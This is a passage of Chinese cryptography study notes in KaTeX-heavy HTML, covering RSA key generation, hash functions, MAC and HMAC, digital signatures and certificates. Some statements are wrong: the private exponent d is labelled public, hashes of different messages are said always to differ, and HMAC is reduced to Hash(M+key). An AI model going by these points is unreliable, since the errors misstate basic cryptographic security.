encoding="application/x-tex">d=29</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">9</span></span></span></span>﻿（因﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><mo>×</mo><mn>29</mn><mo>−</mo><mn>1</mn><mo>=</mo><mn>144</mn><mo>=</mo><mn>72</mn><mo>×</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">5×29-1=144=72×2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">7</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>﻿）</li></ul></li></ul><h3 id="rsa计算">RSA计算</h3><ol><li>随机选择两个大素数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p,q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span>﻿**（保密）**</li><li>计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>×</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">n=p×q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span> ﻿**（公开）**</li><li>计算﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)=(p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>﻿**（保密）**</li><li>选取一个正整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">e</span></span></span></span><strong>（公开）</strong>，选取条件<ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>&lt;</mo><mi>e</mi><mo>&lt;</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1&lt;e&lt;\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68354em;vertical-align:-0.0391em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\operatorname{gcd}(e,\varphi(n))=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm" style="margin-right:0.01389em;">g</span><span class="mord mathrm">c</span><span class="mord mathrm">d</span></span><span class="mopen">(</span><span class="mord mathdefault">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>﻿（即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">e</span></span></span></span>﻿与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>﻿互质）</li></ul></li><li>根据﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>×</mo><mi>d</mi><mo>≡</mo><mn>1</mn><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e×d \equiv 1 (\bmod \varphi(n))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>﻿，求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span></span></span></span><strong>（公开）</strong></li><li><strong>加密运算</strong>：﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><msup><mi>M</mi><mi>e</mi></msup><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C = M^e (\bmod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></li><li><strong>解密运算</strong>：﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>=</mo><msup><mi>C</mi><mi>d</mi></msup><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M = C^d (\bmod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></li><li><strong>公钥</strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>e</mi><mo>=</mo><mo>&lt;</mo><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">Ke=&lt;n,e&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>﻿，<strong>私钥</strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>d</mi><mo>=</mo><mo>&lt;</mo><mi>p</mi><mo separator="true">,</mo><mi>q</mi><mo separator="true">,</mo><mi>d</mi><mo separator="true">,</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">Kd=&lt;p,q,d,\varphi(n)&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span></li></ol><h2 id="哈希算法hash">哈希算法Hash</h2><ul><li><strong>定义</strong>：哈希算法（Hash Function）又称杂凑函数或散列函数，能将任意长度信息转换为固定长度的哈希值（数字摘要），且不同消息生成的哈希值必定不同。</li><li>用﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span></span></span>﻿表示哈希函数，满足：<ul><li>任意输入：输入<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span>﻿可以是任意长度（1bit到1PB）</li><li>固定输出：输出长度固定（MD5为128位，SHA-1为160位，SM3为256位）</li><li>易计算性：给定<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span></span></span>﻿和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span>﻿，计算﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo stretchy="false">(</mo><mi>M</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h(M)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span>﻿容易实现</li><li>强抗碰撞：找不同﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">M_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿和﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">M_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿使<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo stretchy="false">(</mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>h</mi><mo stretchy="false">(</mo><msub><mi>M</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h(M_1)=h(M_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>﻿在计算上不可行</li></ul></li><li>特性：<strong>不可逆性（单向）、无碰撞性、雪崩效应</strong></li><li>典型算法：<ul><li>MD5：512位分组处理，生成<strong>128位摘要</strong>，常用于文件校验</li><li>SHA系列：512位分组处理，SHA-1生成**160位摘要，**比MD5更安全</li><li>SM3：国产算法，512位分组处理，生成<strong>256位摘要</strong></li></ul></li></ul><h3 id="应用">应用</h3><ol><li><p>文件完整性校验</p></li><li><p>账号密码存储</p><ul><li>明文存储：直接保存原始密码，存在内部泄露风险</li><li>哈希存储：存储密码哈希值，但可能被彩虹表攻击破解</li><li>加盐哈希：密码+盐生成哈希，有效防御彩虹表攻击</li></ul></li><li><p>用户身份认证</p><ul><li>客户端发起认证请求</li><li>服务器返回随机数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span></span></span></span></li><li>客户端计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>A</mi><mi>C</mi><mo>=</mo><mi>H</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy="false">(</mo><mtext>密码</mtext><mo>+</mo><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">MAC=Hash(密码+R)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">码</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span>﻿返回，服务器验证</li></ul></li></ol><p>消息认证码（MAC，Message Authentication Code）</p><ul><li>两种实现：<ul><li>基于哈希：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi><mo>=</mo><mi>H</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy="false">(</mo><mi>M</mi><mo>+</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">HMAC=Hash(M+key)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>﻿（如HMAC-SHA256）</li><li>基于对称加密：如AES-CBC-MAC</li></ul></li></ul><h3 id="hash-mac-hmac区别">HASH、MAC、HMAC区别</h3><ul><li>普通哈希：仅验证完整性，无身份认证（无密钥参与）</li><li>MAC：完整性+身份认证（需共享密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span></span></span></span>﻿）</li><li>HMAC：MAC的子集，采用哈希函数构造，输出长度与哈希算法一致</li></ul><h2 id="数字签名">数字签名</h2><p>数字签名可以保证<strong>完整性</strong>和<strong>不可否认性</strong>。</p><p><strong>核心机制</strong>：签名者使用私钥对待签名数据的哈希值进行密码运算，验证时需使用对应的公钥（私钥签名，公钥验证）</p><p><strong>特点</strong>：非否认性、真实性、可鉴别性、不可篡改</p><h3 id="签名和验证过程">签名和验证过程</h3><img src="https://image.icewindy.cn/2025/07/3702187c1f3df2ceadbd685507bae8f8.png" alt="image-20250723153514204" style="zoom:50%;" /><h2 id="pki与数字证书">PKI与数字证书</h2><h3 id="数字证书">数字证书</h3><ul><li>核心作用：用于<strong>证明公钥的真实性</strong>。包含<strong>所有者公钥和CA（认证机构）数字签名</strong>，确保公钥不被伪造。</li><li>获取过程：当Alice需要Bob的公钥时，通过获取Bob的数字证书来确认其公钥的真实性，避免黑客冒充风险。</li><li>签名机制：CA机构使用自己的私钥对证书进行数字签名，相当于公安的防伪标记，确保证书内容（特别是公钥）的真实性。</li><li>包含内容：<ul><li>序列号：证书的唯一标识</li><li>签名算法：采用﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>D</mi><mn>5</mn></mrow><annotation encoding="application/x-tex">MD5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord">5</span></span></span></span>﻿哈希后<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>S</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">RSA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span 